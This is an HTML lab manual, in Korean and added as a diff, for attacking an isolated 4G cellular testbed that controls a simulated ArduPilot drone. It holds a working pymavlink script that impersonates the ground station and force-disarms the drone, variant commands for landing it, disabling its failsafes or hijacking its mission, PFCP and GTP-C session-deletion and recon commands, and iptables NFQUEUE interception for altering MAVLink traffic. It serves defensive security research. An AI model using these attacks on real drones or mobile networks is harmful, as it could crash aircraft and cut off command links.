@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>testbed-4g 공격 실습 가이드 — TM1/TM2/TM3 수행 절차 및 검증 | DAH 2026</title>
+<style>
+:root{
+  --bg:#080b11;--s1:#0d1117;--s2:#111827;
+  --border:#1e2d42;--border2:#253348;
+  --text:#dde6f0;--muted:#5a7090;--dim:#3a5070;
+  --cyan:#22d3ee;--blue:#3b82f6;--green:#10b981;
+  --amber:#f59e0b;--red:#ef4444;--purple:#8b5cf6;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'Noto Sans KR',sans-serif;font-size:15px;line-height:1.85;
+  max-width:920px;margin:0 auto;padding:48px 32px 100px}
+h1{font-size:27px;font-weight:700;margin-bottom:6px;letter-spacing:-.01em}
+.eyebrow{font-family:monospace;font-size:11px;letter-spacing:.12em;color:var(--cyan);text-transform:uppercase;margin-bottom:12px}
+.desc{color:var(--muted);font-size:13.5px;margin-bottom:28px;max-width:700px}
+.scope{background:#1a0808;border:1px solid #5a1a1a;border-left:3px solid var(--red);border-radius:8px;
+  padding:14px 18px;margin-bottom:36px;font-size:12.5px;color:#fca5a5;line-height:1.7}
+.scope b{color:#fecaca}
+.toc{background:var(--s1);border:1px solid var(--border);border-radius:10px;padding:18px 22px;margin-bottom:44px}
+.toc-t{font-size:11px;color:var(--dim);letter-spacing:.08em;margin-bottom:10px;font-family:monospace}
+.toc a{display:block;font-size:13px;color:var(--muted);text-decoration:none;padding:3px 0}
+.toc a:hover{color:var(--cyan)}
+.section{margin-bottom:54px;padding-top:8px;border-top:1px solid var(--border)}
+.section:first-of-type{border-top:none}
+.sh{font-size:19px;font-weight:700;margin:18px 0 6px;display:flex;align-items:center;gap:10px}
+.sn{display:inline-flex;align-items:center;justify-content:center;width:26px;height:26px;border-radius:50%;
+  background:var(--blue);color:#fff;font-family:monospace;font-size:12px;font-weight:700;flex-shrink:0}
+.sn.r{background:var(--red)}.sn.a{background:var(--amber)}.sn.p{background:var(--purple)}.sn.g{background:var(--green)}
+.ss{font-size:12.5px;color:var(--muted);margin-bottom:18px}
+h3{font-size:15px;font-weight:600;margin:22px 0 8px;color:var(--text)}
+h4{font-size:13px;font-weight:600;margin:16px 0 6px;color:var(--cyan)}
+p{font-size:14px;color:#9fb8cc;margin-bottom:12px}
+p strong{color:var(--text)}
+code{font-family:monospace;font-size:12px;background:#0d1520;padding:1px 6px;border-radius:4px;color:#7dd3fc}
+.hl{border-radius:8px;padding:14px 18px;margin:14px 0;font-size:13.5px;line-height:1.75}
+.hl-key{background:#071c2a;border-left:3px solid var(--cyan);color:#7dd3fc}
+.hl-warn{background:#1c1208;border-left:3px solid var(--amber);color:#fcd34d}
+.hl-danger{background:#1a0808;border-left:3px solid var(--red);color:#fca5a5}
+.hl-ok{background:#062016;border-left:3px solid var(--green);color:#6ee7b7}
+.code{background:#050810;border:1px solid var(--border);border-left:3px solid var(--blue);border-radius:6px;
+  padding:12px 16px;margin:12px 0;font-family:monospace;font-size:12px;line-height:1.85;color:#7dd3fc;
+  overflow-x:auto;white-space:pre}
+.code.atk{border-left-color:var(--red)}
+.code.chk{border-left-color:var(--green)}
+.cm{color:#2a4060}.cv{color:#86efac}.ck{color:#f472b6}.cr{color:#fca5a5}
+.steps{margin:14px 0}
+.step{display:flex;gap:12px;margin-bottom:10px;align-items:flex-start}
+.stepn{flex-shrink:0;width:24px;height:24px;border-radius:50%;background:var(--s2);border:1px solid var(--border2);
+  display:flex;align-items:center;justify-content:center;font-family:monospace;font-size:11px;color:var(--cyan)}
+.stepc{font-size:13.5px;color:#9fb8cc;padding-top:2px}
+.stepc strong{color:var(--text)}
+table{width:100%;border-collapse:collapse;font-size:13px;margin:16px 0}
+th{background:#0d1520;color:#5a7090;font-weight:600;padding:9px 12px;text-align:left;
+  border-bottom:1px solid var(--border);font-size:11px;letter-spacing:.04em}
+td{padding:9px 12px;border-bottom:1px solid #0d1520;color:#9fb8cc;vertical-align:top}
+td code{font-size:11.5px}
+.tag{display:inline-block;font-family:monospace;font-size:10.5px;padding:2px 7px;border-radius:4px}
+.tg{background:#062016;color:#6ee7b7;border:1px solid #0f5a30}
+.tr{background:#1a0808;color:#fca5a5;border:1px solid #5a1a1a}
+.ta{background:#1c1208;color:#fcd34d;border:1px solid #6b4a0a}
+.tb{background:#071c2a;color:#7dd3fc;border:1px solid #1e4a6e}
+.src{font-size:11px;color:var(--dim);font-family:monospace;margin-top:12px}
+.chain{display:flex;flex-wrap:wrap;align-items:center;gap:6px;margin:16px 0;font-family:monospace;font-size:11.5px}
+.chain span.box{padding:7px 11px;border-radius:6px;background:var(--s2);border:1px solid var(--border2);color:#9fb8cc;text-align:center}
+.chain span.arrow{color:var(--dim)}
+.chk-list{list-style:none;margin:14px 0}
+.chk-list li{font-size:13px;color:#9fb8cc;padding:6px 0 6px 26px;position:relative}
+.chk-list li:before{content:'\2713';position:absolute;left:0;color:var(--green);font-weight:700}
+</style>
+</head>
+<body>
+
+<div class="eyebrow">DAH 2026 · testbed-4g 실습 매뉴얼</div>
+<h1>testbed-4g 공격 실습 가이드 — TM1 / TM2 / TM3</h1>
+<p class="desc">Open5GS EPC(CUPS) + srsRAN(ZMQ) + ArduPilot SITL 로 구성된 셀룰러 C2 테스트베드에서 TM1/TM2/TM3 세 위협모델의 <strong>수행 가능성을 실측 검증</strong>하기 위한 절차서. 각 공격마다 접속할 컨테이너, 사전 확인 항목, 기초 명령어, 성공 판정 지표, 원복 방법을 담았습니다. 개념 배경은 별도 TM1/TM2/TM3 정리 자료를 참조.</p>
+
+<div class="scope">
+<b>⚠ 사용 범위 · 권한 경계</b><br>
+이 문서는 <b>격리된 자체 테스트베드(로컬 Docker/WSL2)</b> 에서의 방어 연구·수행 가능성 검증만을 대상으로 한다. 실제 이동통신망·타인의 무선/코어 자산·운용 중인 UAV 에 대한 적용은 <b>금지</b>이며 불법이다. 프로젝트 역할경계상 <b>인프라·배선은 준비되어 있고, 공격 실행과 판단은 실습자(사용자) 본인의 책임</b>이다. 모든 명령은 실행 전 대상이 자체 테스트베드 컨테이너임을 확인할 것.
+</div>
+
+<div class="toc">
+  <div class="toc-t">목차</div>
+  <a href="#env">0. 실습 환경 — 토폴로지 · 컨테이너/IP 인벤토리 · 공통 준비</a>
+  <a href="#tm1">1. TM1 — 동일 APN Rogue UE 를 통한 MAVLink 주입</a>
+  <a href="#tm2">2. TM2 — PFCP 세션 삭제 / GTP-C Bearer 파괴 (가용성)</a>
+  <a href="#tm3">3. TM3 — 소프트웨어 eNB(S1-U GTP-U) 평문 변조</a>
+  <a href="#def">4. 방어 검증 — MAVLink 서명 · UE 격리 · PFCP 보호</a>
+  <a href="#reset">5. 관측 체크리스트 · 원복</a>
+</div>
+
+<!-- ============================ 0. 환경 ============================ -->
+<div class="section" id="env">
+  <div class="sh"><span class="sn">0</span>실습 환경 — 토폴로지 · 인벤토리 · 공통 준비</div>
+  <div class="ss">모든 명령의 대상 컨테이너·IP는 이 표를 기준으로 한다</div>
+
+  <h3>0-1. 논리 토폴로지</h3>
+  <div class="chain">
+    <span class="box">UAV SITL<br><small style="color:#5a7090">dah4g-sitl</small></span><span class="arrow">─C2 14550─</span>
+    <span class="box">UAV UE<br><small style="color:#5a7090">srsue_zmq / .2</small></span><span class="arrow">─ZMQ─</span>
+    <span class="box">eNB<br><small style="color:#5a7090">srsenb_zmq</small></span><span class="arrow">─S1-U 2152─</span>
+    <span class="box">EPC (CUPS)<br><small style="color:#5a7090">mme·sgwc/u·smf·upf</small></span>
+  </div>
+  <div class="chain">
+    <span class="box">GCS<br><small style="color:#5a7090">srsue_zmq2 / .3</small></span>
+    <span class="arrow">└ 같은 EPC · 같은 APN(internet) ┘</span>
+    <span class="box">ROGUE(공격자 UE)<br><small style="color:#5a7090">srsue_zmq3 / .4</small></span>
+  </div>
+
+  <h3>0-2. 컨테이너 / IP 인벤토리 (실측 기준)</h3>
+  <table>
+    <tr><th>역할</th><th>컨테이너</th><th>EPC망 IP<br>(172.22.0.0/24)</th><th>셀룰러 IP<br>(tun_srsue, 192.168.100.0/24)</th><th>실습에서의 위치</th></tr>
+    <tr><td>UAV(피해 드론)</td><td><code>srsue_zmq</code> + <code>dah4g-sitl</code></td><td>—</td><td><code>192.168.100.2</code></td><td>TM1/TM3 <b>표적</b></td></tr>
+    <tr><td>GCS(정상 지상국)</td><td><code>srsue_zmq2</code></td><td>172.22.0.55</td><td><code>192.168.100.3</code></td><td>관측·정상 C2</td></tr>
+    <tr><td>ROGUE(공격자 UE)</td><td><code>srsue_zmq3</code></td><td>172.22.0.57</td><td><code>192.168.100.4</code></td><td>TM1 <b>공격 위치</b></td></tr>
+    <tr><td>UAV eNB(소프트웨어 기지국)</td><td><code>srsenb_zmq</code></td><td>172.22.0.22</td><td>—</td><td>TM3 <b>공격 위치</b></td></tr>
+    <tr><td>MME (S1AP·S11·S6a)</td><td><code>mme</code></td><td><code>172.22.0.9</code></td><td>—</td><td>TM2(c)/GTP-C</td></tr>
+    <tr><td>SGW-C / SGW-U (Sxa PFCP)</td><td><code>sgwc</code> / <code>sgwu</code></td><td>inspect 확인</td><td>—</td><td>TM2 표적</td></tr>
+    <tr><td>SMF / UPF (Sxb PFCP · GW)</td><td><code>smf</code> / <code>upf</code></td><td>inspect 확인</td><td>GW <code>192.168.100.1</code></td><td>TM2 표적</td></tr>
+  </table>
+  <div class="hl hl-warn">셀룰러 IP(.2/.3/.4)는 검증 기준값이다. EPC망 NE IP 중 일부는 배포마다 다를 수 있으니 아래 <b>0-3</b> 로 실제 값을 확인해 치환할 것. (핵심 프로토콜 포트: <code>PFCP UDP 8805</code>, <code>S11 GTP-C UDP 2123</code>, <code>S1-U GTP-U UDP 2152</code>, <code>MAVLink UDP 14550</code>)</div>
+
+  <h3>0-3. 공통 준비 — 상태·주소 확인</h3>
+  <div class="code chk"><span class="cm"># 전체 컨테이너 가동 확인 (EPC 9종 + eNB/UE 쌍 + SITL)</span>
+docker ps --format <span class="cv">'{{.Names}}\t{{.Status}}'</span>
+
+<span class="cm"># EPC 네트워크에 붙은 NE 이름 ↔ IP 매핑 (sgwu/upf/sgwc/smf 실제 IP 확인)</span>
+docker network inspect docker_open5gs_default \
+  --format <span class="cv">'{{range .Containers}}{{.Name}} {{.IPv4Address}}{{"\n"}}{{end}}'</span>
+
+<span class="cm"># 각 UE 의 셀룰러 IP(tun_srsue) 재확인</span>
+<span class="cm"># (예상: srsue_zmq=.2  srsue_zmq2=.3  srsue_zmq3=.4)</span>
+for c in srsue_zmq srsue_zmq2 srsue_zmq3; do \
+  echo -n "$c "; docker exec $c ip -o -4 addr show tun_srsue | awk '{print $4}'; done
+
+<span class="cm"># UE-to-UE(동일 APN) 도달성 — TM1 전제. ROGUE → UAV ping</span>
+docker exec srsue_zmq3 ping -I tun_srsue -c3 <span class="cv">192.168.100.2</span></div>
+
+  <h3>0-4. 실습용 SITL 기동 (주입 엔드포인트 개방)</h3>
+  <p>TM1(주입)·TM3(변조) 을 관측하려면 UAV SITL 이 셀룰러 상에서 MAVLink 를 <strong>수신(listen)</strong> 해야 한다. 기존 <code>45-g1-gazebo.sh</code>/<code>40-g1-c2.sh</code> 는 SITL 을 <code>udpclient→GCS</code> 로만 띄우므로, 실습에선 UAV 측에 <code>udpin:14550</code> 을 추가로 연다(공격자가 UAV:14550 으로 도달 가능해짐 = 위협모델의 표적면).</p>
+  <div class="code"><span class="cm"># Gazebo 시각화까지 함께 볼 경우: 45-g1-gazebo.sh 의 arducopter 인자에</span>
+<span class="cm">#   --serial1 udpin:0.0.0.0:14550  를 추가해 기동 (serial0=GCS C2 유지)</span>
+<span class="cm"># 빠른 실습(물리만)일 경우 아래처럼 직접 기동:</span>
+GCS=192.168.100.3
+docker rm -f dah4g-sitl 2>/dev/null
+docker run -d --name dah4g-sitl --network container:srsue_zmq dah-testbed-air \
+  sh -c "cd /tmp &amp;&amp; exec /home/ardu/ardupilot/build/sitl/bin/arducopter \
+    --model quad --speedup 1 -I0 \
+    --defaults /home/ardu/ardupilot/Tools/autotest/default_params/copter.parm \
+    --home 37.5665,126.9780,30,0 \
+    --serial0 udpclient:$GCS:14550 \
+    <span class="ck">--serial1 udpin:0.0.0.0:14550</span>"   <span class="cm"># ← 주입 표적 포트</span></div>
+  <div class="hl hl-key">이 <code>--serial1 udpin</code> 개방은 "UAV 가 셀룰러 상에서 C2 서비스를 노출한다"는 현실 전제를 재현하는 <b>인프라 준비</b>이지 공격 자체가 아니다. 실제 배치에서 UAV↔GCS 가 UDP 로 오가면 이 표적면이 자연히 존재한다.</div>
+</div>
+
+<!-- ============================ 1. TM1 ============================ -->
+<div class="section" id="tm1">
+  <div class="sh"><span class="sn r">1</span>TM1 — 동일 APN Rogue UE 를 통한 MAVLink 주입</div>
+  <div class="ss">공격자 UE(.4)가 같은 APN 풀에서 UAV(.2)에 직접 도달 → SysID 255 로 GCS 사칭 → 명령 주입</div>
+
+  <p><strong>위협 요약.</strong> 같은 APN(<code>internet</code>) 에 붙은 UE 들은 UPF hairpin 으로 서로 IP 도달이 된다(UE-to-UE). MAVLink 는 인증이 없으므로(Signing OFF 전제), ROGUE 가 GCS(SysID 255)를 사칭해 UAV 의 14550 으로 명령을 보내면 UAV 는 정상 GCS 로 오인해 수용한다.</p>
+
+  <h3>1-1. 공격자 위치 · 접속</h3>
+  <p>공격자는 ROGUE UE 컨테이너 <code>srsue_zmq3</code> 의 <strong>네트워크 네임스페이스</strong>에서 동작해야 트래픽의 출발 IP 가 셀룰러 <code>192.168.100.4</code> 가 된다. pymavlink 가 있는 <code>dah-testbed-air</code> 이미지를 그 netns 로 실행한다.</p>
+  <div class="code"><span class="cm"># ROGUE netns 로 진입해 대화형 셸(도구 확인용)</span>
+docker exec -it srsue_zmq3 bash
+<span class="cm"># └ 여기서 나가는 패킷의 src = 192.168.100.4 (동일 APN UE)</span></div>
+
+  <h3>1-2. 사전 확인 (표적 식별)</h3>
+  <div class="code chk"><span class="cm"># (A) UAV 도달성 — 0-3 의 UE-to-UE ping 이 성공해야 함</span>
+docker exec srsue_zmq3 ping -I tun_srsue -c3 192.168.100.2
+
+<span class="cm"># (B) UAV 의 MAVLink 포트가 열려 수신 중인지 — SITL netns(=srsue_zmq)에서 확인</span>
+<span class="cm">#     dah4g-sitl 는 srsue_zmq netns 를 공유하므로 소켓이 여기서 보인다</span>
+docker exec srsue_zmq ss -unlp | grep <span class="cv">14550</span>
+
+<span class="cm"># (C) 정상 C2 흐름 관찰(선택) — UAV↔GCS MAVLink 가 셀룰러로 흐르는지</span>
+docker exec srsue_zmq tcpdump -ni any udp port 14550 -c 10</div>
+
+  <h3>1-3. 공격 실행 — GCS 사칭 · 명령 주입</h3>
+  <p>아래 스크립트를 ROGUE netns 에서 실행한다. <code>source_system=255</code>(GCS 기본 SysID)로 HEARTBEAT 를 보내 UAV 가 이 발신자를 GCS 로 등록하게 한 뒤, <strong>Force-DISARM</strong>(cmd 400, param2=21196)을 주입한다.</p>
+  <div class="code atk"><span class="cr"># ROGUE(.4) netns 에서 pymavlink 로 주입 — 표적 = UAV 192.168.100.2:14550</span>
+docker run -i --rm --network container:srsue_zmq3 dah-testbed-air python3 - &lt;&lt;'PY'
+from pymavlink import mavutil
+import time
+TGT = 'udpout:192.168.100.2:14550'
+m = mavutil.mavlink_connection(TGT, source_system=<span class="ck">255</span>, source_component=190)
+<span class="cm"># 1) GCS 사칭 HEARTBEAT 를 몇 번 보내 발신자를 '정상 GCS'로 각인</span>
+for _ in range(5):
+    m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
+                         mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
+    time.sleep(0.2)
+<span class="cm"># 2) Force-DISARM 주입 (비행 중이면 모터 강제 정지 → 추락)</span>
+m.mav.command_long_send(1, 1, mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
+                        0, <span class="ck">0</span>, <span class="ck">21196</span>, 0,0,0,0,0)   <span class="cm"># param1=0(disarm) param2=21196(force)</span>
+print('[TM1] force-DISARM 주입 송신 완료 (SysID 255 사칭)')
+PY</span></div>
+
+  <h4>변형 명령 (같은 방식으로 param 만 교체)</h4>
+  <table>
+    <tr><th>목적</th><th>MAVLink</th><th>효과</th></tr>
+    <tr><td>강제 착륙/유도</td><td><code>MAV_CMD_NAV_LAND</code> (cmd 21)</td><td>비행 중단·강제 하강</td></tr>
+    <tr><td>안전장치 무력화</td><td><code>PARAM_SET ARMING_CHECK=0</code>, <code>FS_GCS_ENABLE=0</code></td><td>잔류 효과(재부팅까지)</td></tr>
+    <tr><td>경로 탈취</td><td><code>MISSION_COUNT→ITEM_INT→SET_CURRENT</code></td><td>임의 좌표로 임무 변경</td></tr>
+    <tr><td>C2 포화(DoS)</td><td><code>RC_CHANNELS_OVERRIDE</code> 고빈도 송신</td><td>정상 GCS 명령 경합·마비</td></tr>
+  </table>
+
+  <h3>1-4. 성공 판정 — 무엇을 확인하나</h3>
+  <ul class="chk-list">
+    <li>GCS 측(<code>srsue_zmq2</code> netns 에서 <code>g2_flight.py</code>/<code>g1_gcs.py</code> 모니터) 관측 시, 비행 중이던 UAV 가 <strong>DISARM/추락</strong> 하거나 명령이 반영됨</li>
+    <li>Gazebo 시각화(<code>http://localhost:6080/vnc.html</code>) 를 켰다면 기체가 <strong>낙하</strong>하는 장면이 직접 보임</li>
+    <li>UAV 가 SysID 255 발신자를 구분 없이 수용 = <strong>인증 부재(CWE-306) 실증</strong></li>
+    <li>정상 GCS 와 공격자가 동시 송신 시, UDP 특성상 <strong>나중/고빈도 패킷이 적용</strong>됨(경합)</li>
+  </ul>
+  <div class="code chk"><span class="cm"># GCS netns 에서 비행 상태 관찰(공격 전 arm/takeoff 시켜 두고 TM1 주입)</span>
+docker run -i --rm --network container:srsue_zmq2 dah-testbed-air \
+  python3 - &lt; testbed-4g/scripts/g2_flight.py</div>
+  <div class="hl hl-danger">이 공격이 통하는 본질은 PDCP 암호(ARIA/SEED 포함)가 뚫려서가 아니라, <strong>①UPF 가 동일 APN UE 간 라우팅을 격리하지 않고 ②MAVLink 에 인증이 없기</strong> 때문이다. 두 지점 모두 암호 강도와 무관하다.</div>
+  <div class="src">배경: TM1_동일APN공격_정리.html · CWE-306 · MAVLink2 Signing</div>
+</div>
+
+<!-- ============================ 2. TM2 ============================ -->
+<div class="section" id="tm2">
+  <div class="sh"><span class="sn a">2</span>TM2 — PFCP 세션 삭제 / GTP-C Bearer 파괴 (가용성)</div>
+  <div class="ss">내용을 보지 않고 C2 링크 자체를 끊는다 — Open5GS EPC 는 CUPS 라 Sxa/Sxb PFCP(8805) 존재</div>
+
+  <p><strong>위협 요약.</strong> 코어 제어망에 도달한 공격자가 <strong>인증되지 않는 PFCP</strong>(UDP 8805)로 UAV 세션의 SEID 를 삭제하거나, S11 GTP-C(2123)로 Bearer 를 강제 해제하면 UAV 의 GTP-U 터널이 철거되어 <strong>C2 가 두절</strong>된다. MAVLink 서명으로도 못 막는다(연결 자체를 파괴하므로).</p>
+  <div class="hl hl-key">전제: TM2 는 <b>코어 제어망 접근</b>을 요구한다. 실제 배치라면 TM1 이후 측면이동이 필요하지만, <b>본 테스트베드는 모든 NE 가 같은 <code>docker_open5gs_default</code> 브리지에 격리 없이 놓여</b> 있으므로("환경 취약형" 전제) 코어망 도달이 이미 성립한다 — 이 점을 보고서엔 명시적 전제로 기술할 것.</p>
+
+  <h3>2-1. 공격자 위치 · 접속</h3>
+  <p>EPC 제어망(172.22.0.0/24)에 붙은 공격자 노드가 필요하다. 도구가 갖춰진 컨테이너를 그 네트워크에 임시로 띄운다.</p>
+  <div class="code"><span class="cm"># 정찰·캡처 도구 컨테이너를 EPC 망에 부착 (netshoot = tcpdump/nmap/scapy 등 내장)</span>
+docker run -it --rm --name dah4g-attacker \
+  --network docker_open5gs_default --cap-add NET_RAW --cap-add NET_ADMIN \
+  nicolaka/netshoot bash</div>
+
+  <h3>2-2. 사전 확인 — 코어 도달 · PFCP 노출 · 평문 여부</h3>
+  <div class="code chk"><span class="cm"># (A) 제어망 호스트 탐색</span>
+nmap -sn 172.22.0.0/24
+
+<span class="cm"># (B) PFCP(8805)·GTP-C(2123) 개방 NE 식별 (sgwu/upf/sgwc/smf/mme)</span>
+nmap -sU -p 8805,2123 172.22.0.0/24
+
+<span class="cm"># (C) PFCP 가 평문·무인증임을 관찰 — SGW-U/UPF 에서 Sxa/Sxb 캡처</span>
+<span class="cm">#     (스위치 브리지라 타 NE 트래픽은 안 보이므로, 대상 NE 자체에서 캡처)</span>
+docker exec sgwu tcpdump -ni any udp port 8805 -X -c 20
+docker exec upf  tcpdump -ni any udp port 8805 -X -c 20
+<span class="cm"># └ Session Establishment/Report 메시지에서 활성 SEID·노드 IP 가 평문 노출</span></div>
+  <div class="hl hl-warn">여기까지(A~C)만으로도 <b>"PFCP 가 도달 가능·평문·발신자 인증 없음"</b> 이라는 TM2 의 구조적 결함이 실측된다. 3GPP TS 29.244 는 Sxa/Sxb 발신자 인증을 의무화하지 않고 IPsec 을 권고(옵션)로만 둔다.</div>
+
+  <h3>2-3. 공격 실행 — 세션 삭제 / Bearer 해제</h3>
+  <h4>(a) PFCP Session Deletion (4G CUPS 최우선 경로)</h4>
+  <div class="steps">
+    <div class="step"><div class="stepn">1</div><div class="stepc">SGW-U/UPF(8805)로 <strong>PFCP Association Setup Request</strong> → 정상 SGW-C/SMF 로 위장 수립</div></div>
+    <div class="step"><div class="stepn">2</div><div class="stepc">2-2(C) 캡처에서 얻은 <strong>UAV 세션 SEID</strong> 지정</div></div>
+    <div class="step"><div class="stepn">3</div><div class="stepc"><strong>PFCP Session Deletion Request</strong> 전송 → GTP-U 터널 철거 → UAV C2 두절</div></div>
+  </div>
+  <div class="code atk"><span class="cr"># PFCP 클라이언트로 삭제 요청 (SEID 는 2-2 캡처값으로 치환)</span>
+<span class="cr"># PFCP 는 scapy 기본 미지원 → PFCP 지원 도구/스크립트 사용</span>
+<span class="cr"># (TM2 자료의 pfcp_attack.py 형태, 또는 open5gs libpfcp 기반 PoC)</span>
+python3 pfcp_attack.py --target <span class="cv">&lt;UPF_IP&gt;</span> --action association_setup
+python3 pfcp_attack.py --target <span class="cv">&lt;UPF_IP&gt;</span> --action session_deletion --seid <span class="ck">&lt;UAV_SEID&gt;</span></div>
+
+  <h4>(b) GTP-C S11 Delete Bearer (4G 네이티브 대안)</h4>
+  <div class="code atk"><span class="cr"># MME(172.22.0.9)↔SGW-C 간 S11(GTP-C UDP 2123) 로 Delete Bearer Request</span>
+<span class="cr"># 신뢰관계 기반 인증만 있으므로 동일 세그먼트 노드가 MME 사칭 가능</span>
+docker exec mme tcpdump -ni any udp port 2123 -c 20   <span class="cm"># TEID/세션 식별</span>
+<span class="cm"># → GTP-C 라이브러리로 Delete Bearer/Session Request 주입</span></div>
+
+  <div class="hl hl-key"><b>4G/5G 정정(자료 반영):</b> PFCP 세션 삭제는 EPC 가 CUPS 라 <span class="tag tg">4G 가능</span>. 반면 SBI(HTTP/2) 기반 NRF/SMF 크래시는 <span class="tag tr">5G SA 전용</span> — EPC 엔 SBA 자체가 없으므로 이 테스트베드에서 재현 대상이 아니다.</div>
+
+  <h3>2-4. 성공 판정 — 무엇을 확인하나</h3>
+  <ul class="chk-list">
+    <li>GCS 가 UAV HEARTBEAT 를 <strong>수신 중단</strong> (<code>g1_gcs.py</code> 가 타임아웃)</li>
+    <li>UAV 의 데이터 베어러 소실 — <code>docker exec srsue_zmq ping -I tun_srsue 192.168.100.1</code> (GW) <strong>실패</strong></li>
+    <li>SITL 이 <strong>GCS failsafe</strong> 진입(모드 전환/RTL/LAND) — SITL 로그·Gazebo 관측</li>
+    <li>PFCP 캡처상 삭제 요청에 SGW-U/UPF 가 <strong>인증 검증 없이 응답</strong></li>
+  </ul>
+  <div class="code chk"><span class="cm"># 두절 관측: GCS netns 에서 하트비트 대기 → 타임아웃이면 C2 두절 실증</span>
+docker run -i --rm --network container:srsue_zmq2 dah-testbed-air \
+  python3 - &lt; testbed-4g/scripts/g1_gcs.py</div>
+  <div class="hl hl-danger">TM2 는 기밀성/무결성이 아니라 <strong>가용성</strong> 공격이라 MAVLink Signing 이 무력하다. 방어는 코어 제어망 분리 + PFCP IPsec(Sxb') + S11 ACL 이다(4장).</div>
+  <div class="src">배경: TM2_PFCP_GTPC_파괴_정리.html · 3GPP TS 29.244/29.274/29.272 · Open5GS CUPS</div>
+</div>
+
+<!-- ============================ 3. TM3 ============================ -->
+<div class="section" id="tm3">
+  <div class="sh"><span class="sn p">3</span>TM3 — 소프트웨어 eNB(S1-U GTP-U) 평문 변조</div>
+  <div class="ss">eNB 는 PDCP 복호화 종단 — 그 뒤 S1-U GTP-U(2152)는 평문. 그 위치를 장악해 MAVLink 를 변조</div>
+
+  <p><strong>위협 요약.</strong> UAV↔eNB 무선 구간(ZMQ)은 PDCP 로 보호되지만 <strong>eNB 에서 복호화가 끝난다.</strong> 이후 eNB→EPC 의 S1-U GTP-U 구간은 평문이므로, eNB 를 장악한 자는 그 안의 MAVLink 를 들여다보고 조작할 수 있다. 본 테스트베드의 eNB 는 <strong>소프트웨어 컨테이너(<code>srsenb_zmq</code>)</strong> = 자료의 "vRAN/소프트웨어 eNB" 경로에 해당하며, <code>docker exec</code>(≈ 자료의 <code>kubectl exec</code>)로 그 위치를 확보한다.</p>
+  <div class="hl hl-warn">자료의 또 다른 경로인 <b>Rogue eNB(RF 신호 우위)</b> 는 SDR 하드웨어가 필요해 <b>ZMQ 가상 라디오 테스트베드에서는 재현 불가</b>(정직한 한계). 본 랩에서 재현 가능한 TM3 = <b>소프트웨어 eNB 장악 후 S1-U 변조</b>이며, 이것이 Operation Spiderweb(4G)에 가장 직결된다.</div>
+
+  <h3>3-1. 공격자 위치 · 접속</h3>
+  <div class="code"><span class="cm"># UAV 의 eNB 컨테이너(=PDCP 종단) 셸 확보</span>
+docker exec -it srsenb_zmq bash
+<span class="cm"># └ 이 위치가 곧 "탈취된 eNB" = S1-U GTP-U 평문 구간의 종단</span></div>
+
+  <h3>3-2. 사전 확인 — S1-U 평문에 MAVLink 가 보이는가</h3>
+  <div class="code chk"><span class="cm"># eNB→SGW-U 의 S1-U GTP-U(UDP 2152) 캡처. GTP-U 헤더(8B) 안쪽에 MAVLink</span>
+<span class="cm"># v2 매직 0xFD / v1 매직 0xFE 바이트가 평문으로 보이면 = 변조 표면 실증</span>
+docker exec srsenb_zmq tcpdump -ni any udp port 2152 -X -c 20 | grep -iE 'fd|fe'</div>
+  <div class="hl hl-key">GTP-U 페이로드에서 MAVLink 매직바이트가 평문으로 확인되면, "eNB 이후 구간은 암호화되지 않는다"는 TM3 의 핵심 전제가 실측된 것이다(PDCP 알고리즘이 ARIA/SEED 여도 무관 — 복호화가 이미 끝난 지점).</div>
+
+  <h3>3-3. 공격 실행 — NFQUEUE 로 실시간 변조</h3>
+  <p>iptables 로 S1-U GTP-U 패킷을 NFQUEUE 로 우회시키고, netfilterqueue+scapy 스크립트가 GTP-U 헤더를 벗겨 내부 MAVLink 를 수정(예: 명령 치환/드롭) 후 재주입한다. 도구가 없으면 해당 도구를 갖춘 사이드카를 eNB netns 로 띄운다.</p>
+  <div class="code atk"><span class="cr"># (1) eNB netns 에서 S1-U 를 NFQUEUE 로 가로채기</span>
+docker exec srsenb_zmq iptables -I FORWARD -p udp --dport 2152 -j NFQUEUE --queue-num 0
+docker exec srsenb_zmq iptables -I OUTPUT  -p udp --dport 2152 -j NFQUEUE --queue-num 0
+
+<span class="cr"># (2) 변조 스크립트 실행 (scapy + NetfilterQueue). 도구 미설치 시 사이드카:</span>
+<span class="cr">#     docker run --network container:srsenb_zmq --cap-add NET_ADMIN &lt;scapy이미지&gt; python3 mangle.py</span>
+<span class="cm"># mangle.py 개요:</span>
+<span class="cm">#   pkt → IP/UDP(2152)/GTP-U(8B 헤더 skip) → 내부 IP/UDP(14550)/MAVLink</span>
+<span class="cm">#   MAVLink 파싱 → 특정 필드 변조(예: NAV_LAND 삽입, 좌표 변경) → CRC 재계산 → accept</span></div>
+  <div class="hl hl-danger">주의: NFQUEUE 규칙은 처리 스크립트가 큐를 소비하지 않으면 해당 트래픽이 <strong>드롭</strong>되어 C2 가 끊긴다. 반드시 소비 스크립트를 먼저 준비하고, 실습 후 <b>3-5</b> 로 규칙을 제거할 것.</div>
+
+  <h3>3-4. 성공 판정 — 무엇을 확인하나</h3>
+  <ul class="chk-list">
+    <li>GCS/SITL 에서 <strong>보내지 않은 명령이 반영</strong>되거나(변조), 특정 명령이 <strong>사라짐</strong>(드롭)</li>
+    <li>UAV·GCS 양측 모두 변조를 <strong>탐지하지 못함</strong>(무결성 부재) — Signing OFF 전제</li>
+    <li>S1-U 캡처에서 원본과 다른 MAVLink 페이로드가 나가는 것을 확인</li>
+    <li>MAVLink 서명 ON(4장) 으로 전환 시 변조 패킷이 <strong>거부</strong>됨 → 방어 대비 실증</li>
+  </ul>
+
+  <h3>3-5. 원복</h3>
+  <div class="code"><span class="cm"># NFQUEUE 규칙 제거 (C2 정상화)</span>
+docker exec srsenb_zmq iptables -D FORWARD -p udp --dport 2152 -j NFQUEUE --queue-num 0
+docker exec srsenb_zmq iptables -D OUTPUT  -p udp --dport 2152 -j NFQUEUE --queue-num 0
+docker exec srsenb_zmq iptables -L -n</div>
+  <div class="src">배경: TM3_소프트웨어적_eNB침투_정리.html · 3GPP TS 33.401(LTE AKA) · S1-U GTP-U(TS 29.281)</div>
+</div>
+
